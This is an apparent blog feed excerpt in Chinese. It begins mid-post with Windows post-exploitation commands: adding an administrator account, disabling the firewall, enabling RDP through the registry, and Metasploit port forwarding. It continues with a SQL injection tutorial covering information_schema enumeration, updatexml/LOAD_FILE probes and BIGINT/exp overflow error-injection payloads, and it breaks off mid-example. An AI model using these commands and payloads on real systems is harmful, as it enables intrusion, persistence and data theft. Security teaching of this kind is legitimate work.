class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net user steady111 125219gxaGXA &#x2F;add</span><br><span class="line">net user steady111 125219gxaGXA &#x2F;add</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net localgroup administrators steady111 &#x2F;add</span><br><span class="line">net localgroup administrators steady111 &#x2F;add</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><ul><li><p>开启关闭防火墙</p><p>windows2003之前</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开启防火墙：</span><br><span class="line">netsh firewall set opmode mode&#x3D;enable</span><br><span class="line">关闭防火墙：</span><br><span class="line">netsh firewall set opmode mode&#x3D;disable</span><br></pre></td></tr></table></figure><p>windows2003之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure></li></ul><ul><li>开启3389</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"> </span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal&quot; 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f</span><br><span class="line">&quot; 2&gt;&amp;1</span><br></pre></td></tr></table></figure><ul><li>检查3389是否开放</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server</span><br><span class="line"></span><br><span class="line">1表示关闭0表示开放</span><br><span class="line"></span><br><span class="line">fDenyTSConnections    REG_DWORD    0x1</span><br></pre></td></tr></table></figure><ul><li>查看远程桌面服务所在的端口</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</span><br></pre></td></tr></table></figure><h5 id="MSF与3389"><a href="#MSF与3389" class="headerlink" title="MSF与3389"></a>MSF与3389</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp  #开启远程桌面</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;www2 PASSWORD&#x3D;123456 #添加用户</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6662  #将3389端口转发到6662</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口</span><br><span class="line">run getgui -f 6661 –e</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Metasploit使用&quot;&gt;&lt;a href=&quot;#Metasploit使用&quot; class=&quot;headerlink&quot; title=&quot;Metasploit使用&quot;&gt;&lt;/a&gt;Metasploit使用&lt;/h1&gt;&lt;h3 id=&quot;基础常用命令&quot;&gt;&lt;a href=&quot;#基础常用命令&quot;</summary>
      
    
    
    
    <category term="内网安全" scheme="http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内网" scheme="http://s1eady.top/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>SQL--SQL注入漏洞</title>
    <link href="http://s1eady.top/2020/08/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://s1eady.top/2020/08/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-08-22T14:46:26.000Z</published>
    <updated>2020-10-06T09:55:32.783Z</updated>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>用户将恶意的sql语句输入到参数中，恶意语句拼接到后台sql语句，执行sql语句到时候使得攻击者获取到对应的敏感数据，比如当前数据库用户、数据库中的表等信息，也可以读取敏感文件、写入服务器shell，进而获取主机权限。</p><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>MySQL 5.0以上版本。</p><p>数据库</p><ul><li><p><strong>information_schema</strong></p><p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息。</p></li></ul><p>表</p><ul><li><p><strong>SCHEMATA</strong></p><p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等。</p></li><li><p><strong>TABLES</strong></p><p>提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。</p></li><li><p><strong>COLUMNS</strong></p><p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use information_schema;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table <span class="keyword">and</span> column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| Tables_in_information_schema          |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| TABLES                                |</span><br><span class="line">| SCHEMATA                              |</span><br><span class="line">| COLLATION_CHARACTER_SET_APPLICABILITY |</span><br><span class="line">| COLUMNS                               |</span><br><span class="line">mysql&gt; desc TABLES;</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field           | Type                | Null | Key | Default | Extra |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| TABLE_CATALOG   | varchar(<span class="number">512</span>)        | NO   |     |         |       |</span><br><span class="line">| TABLE_SCHEMA    | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME      | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_TYPE      | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| ENGINE          | varchar(<span class="number">64</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| VERSION         | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| ROW_FORMAT      | varchar(<span class="number">10</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_ROWS      | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AVG_ROW_LENGTH  | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_LENGTH     | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| MAX_DATA_LENGTH | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| INDEX_LENGTH    | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_FREE       | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AUTO_INCREMENT  | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| UPDATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| CHECK_TIME      | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COLLATION | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| CHECKSUM        | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_OPTIONS  | varchar(<span class="number">255</span>)        | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COMMENT   | varchar(<span class="number">2048</span>)       | NO   |     |         |       |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">mysql&gt; desc COLUMNS;</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field                    | Type                | Null | Key | Default | Extra |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| TABLE_CATALOG            | varchar(<span class="number">512</span>)        | NO   |     |         |       |</span><br><span class="line">| TABLE_SCHEMA             | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME               | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| COLUMN_NAME              | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| ORDINAL_POSITION         | bigint(<span class="number">21</span>) unsigned | NO   |     | <span class="number">0</span>       |       |</span><br><span class="line">| COLUMN_DEFAULT           | longtext            | YES  |     | NULL    |       |</span><br><span class="line">| IS_NULLABLE              | varchar(<span class="number">3</span>)          | NO   |     |         |       |</span><br><span class="line">| DATA_TYPE                | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| CHARACTER_MAXIMUM_LENGTH | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CHARACTER_OCTET_LENGTH   | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| NUMERIC_PRECISION        | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| NUMERIC_SCALE            | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATETIME_PRECISION       | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CHARACTER_SET_NAME       | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| COLLATION_NAME           | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| COLUMN_TYPE              | longtext            | NO   |     | NULL    |       |</span><br><span class="line">| COLUMN_KEY               | varchar(<span class="number">3</span>)          | NO   |     |         |       |</span><br><span class="line">| EXTRA                    | varchar(<span class="number">30</span>)         | NO   |     |         |       |</span><br><span class="line">| PRIVILEGES               | varchar(<span class="number">80</span>)         | NO   |     |         |       |</span><br><span class="line">| COLUMN_COMMENT           | varchar(<span class="number">1024</span>)       | NO   |     |         |       |</span><br><span class="line">| GENERATION_EXPRESSION    | longtext            | NO   |     | NULL    |       |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line"><span class="number">21</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li></ul><p>总结</p><p>MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">information_schema的表schemata中的列schema_name记录了所有数据库的名字</span><br><span class="line">information_schema的表tables中的列table_schema记录了所有数据库的名字</span><br><span class="line">information_schema的表tables中的列table_name记录了所有数据库的表的名字</span><br><span class="line">information_schema的表columns中的列table_schema记录了所有数据库的名字</span><br><span class="line">information_schema的表columns中的列table_name记录了所有数据库的表的名字</span><br><span class="line">information_schema的表columns中的列column_name记录了所有数据库的表的列的名字</span><br></pre></td></tr></table></figure><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><h5 id="right、left函数"><a href="#right、left函数" class="headerlink" title="right、left函数"></a>right、left函数</h5><p><code>LEFT()</code>函数是一个字符串函数,它返回具有指定长度的字符串的左边部分，<strong>我们在注入的时候，前台可能会限制回显字段，这时候我们可以使用这两个函数</strong>。</p><p>right同理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>);</span><br><span class="line">+-----------------------+</span><br><span class="line">| right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| <span class="number">67890</span>                 |</span><br><span class="line">+-----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">+-----------------------+</span><br><span class="line">| right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">2</span>) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| <span class="number">90</span>                    |</span><br><span class="line">+-----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select left(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>);</span><br><span class="line">+----------------------+</span><br><span class="line">| left(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>) |</span><br><span class="line">+----------------------+</span><br><span class="line">| <span class="number">12345</span>                |</span><br><span class="line">+----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h5 id="isnull-exp"><a href="#isnull-exp" class="headerlink" title="isnull(exp)"></a>isnull(exp)</h5><p>如果exp为null返回1，否侧返回0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select isnull(<span class="number">1</span>+<span class="number">1</span>);</span><br><span class="line">+-------------+</span><br><span class="line">| isnull(<span class="number">1</span>+<span class="number">1</span>) |</span><br><span class="line">+-------------+</span><br><span class="line">|           <span class="number">0</span> |</span><br><span class="line">+-------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select isnull(<span class="number">0</span>);</span><br><span class="line">+-----------+</span><br><span class="line">| isnull(<span class="number">0</span>) |</span><br><span class="line">+-----------+</span><br><span class="line">|         <span class="number">0</span> |</span><br><span class="line">+-----------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>可以配合注入来判断文件是否存在以及是否有权限读取文件。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> math where id=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,concat(<span class="number">0x7e</span>,isnull(LOAD_FILE(<span class="string">&#x27;/Users/apple/Desktop/2.txt&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">0</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~1~&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="ifnull-expr1-expr2"><a href="#ifnull-expr1-expr2" class="headerlink" title="ifnull(expr1,expr2)"></a>ifnull(expr1,expr2)</h5><p>假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2。IFNULL()的返回值是数字或是字符串。</p><h4 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h4><h5 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h5><p>二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。</p><ul><li><p>按位或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>|<span class="number">9879</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>|<span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line">|   <span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li><li><p>按位异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>^<span class="number">9879</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>^<span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line">|   <span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li><li><p>按位与</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>&amp;<span class="number">5464</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>&amp;<span class="number">5464</span> |</span><br><span class="line">+--------+</span><br><span class="line">|      <span class="number">0</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li></ul><p>0与任何的数字A按位或、异或都是A数字。</p><p>0与任何数字按位与都是0。</p><p>逻辑运算符</p><p>逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。</p><ul><li><p>与运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span>;</span><br><span class="line">+---------+</span><br><span class="line">| <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span> |</span><br><span class="line">+---------+</span><br><span class="line">|       <span class="number">0</span> |</span><br><span class="line">+---------+    </span><br><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>;   </span><br><span class="line">+---------+     </span><br><span class="line">| <span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span> |      </span><br><span class="line">+---------+      </span><br><span class="line">|       <span class="number">1</span> |      </span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure></li><li><p>或运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">or</span> <span class="number">0</span>;</span><br><span class="line">  +--------+</span><br><span class="line">  | <span class="number">2</span> <span class="keyword">or</span> <span class="number">0</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  |      <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  </span><br><span class="line">  mysql&gt; select <span class="number">2</span> <span class="keyword">or</span> <span class="number">1</span>;</span><br><span class="line">  +--------+</span><br><span class="line">  | <span class="number">2</span> <span class="keyword">or</span> <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  |      <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br></pre></td></tr></table></figure></li><li><p>非运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="keyword">not</span> <span class="number">1</span>;</span><br><span class="line">  +-------+</span><br><span class="line">  | <span class="keyword">not</span> <span class="number">1</span> |</span><br><span class="line">  +-------+</span><br><span class="line">  |     <span class="number">0</span> |</span><br><span class="line">  +-------+</span><br><span class="line">  </span><br><span class="line">  mysql&gt; select !<span class="number">0</span>;</span><br><span class="line">  +----+</span><br><span class="line">  | !<span class="number">0</span> |</span><br><span class="line">  +----+</span><br><span class="line">  |  <span class="number">1</span> |</span><br><span class="line">  +----+</span><br></pre></td></tr></table></figure></li></ul><h4 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h4><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>原理：</p><p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为<code>union</code>或<code>union all</code>。</p><p>条件：</p><p>页面有回显、有占位符</p><p>占位符：</p><p>从数据库中取出某些输入能够显示到页面上的某一个位置。</p><p>步骤：</p><ul><li><p>判断是否有注入</p></li><li><p>判断是数字型注入还是字符型注入</p></li><li><p>猜测查询列数</p><p>列数小,正常回显,num大,不回显。</p></li><li><p>寻找占位</p></li><li><p>获取所有数据库名</p></li><li><p>获取指定数据的所有表名</p></li><li><p>获取指定数据库的指定数据表的所有字段名</p></li><li><p>获取指定数据库的指定数据表的所有的内容</p></li></ul><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><ul><li><p>BIGINT等数据类型溢出</p><ul><li><p>原理：</p><ul><li><p>在mysql5.5之前，整形溢出是不会报错的，只有版本号大于5.5.5时，才会报错。</p><p>在mysql中要想获取BIGINT最大值，可以直接0按位置取反,超出最大值就会报错，而sql语句在执行成功的时候会返回0，取反之后就会变成1。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select (select * from (select user())x);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| (select * from (select user())x) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| root@localhost                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| !(select * from (select user())x) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>超出最大值就会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(~(0) + 1)&#39;</span><br></pre></td></tr></table></figure></li><li><p>SQL注入利用</p><p>组合好逐位取反和逻辑取反运算，我们就能利用溢出错误来成功的注入查询。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0+!(select*from(select user())x);</span><br><span class="line">ERROR 1690 (22003): BIGINT value is out of range in &#39;(~(0) + (not((select &#39;root@localhost&#39; from dual))))&#39;</span><br></pre></td></tr></table></figure><p>返回0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from(select user())x</span><br></pre></td></tr></table></figure><p>返回1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!(select*from(select user())x);</span><br></pre></td></tr></table></figure><p>溢出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~0+!(select*from(select user())x);</span><br></pre></td></tr></table></figure><p>同理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!(select*from(select user())x)-~0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username, password from users where id&#x3D;&#39;1&#39; or !(select*from(select user())x)-~0;</span><br></pre></td></tr></table></figure></li></ul><p>注意：</p><p>当MySQL版本大于或等于5.5.53时，数据溢出注入无效。</p></li><li><p>exp()函数：当传入的数值大于709的时候就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(709);</span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span 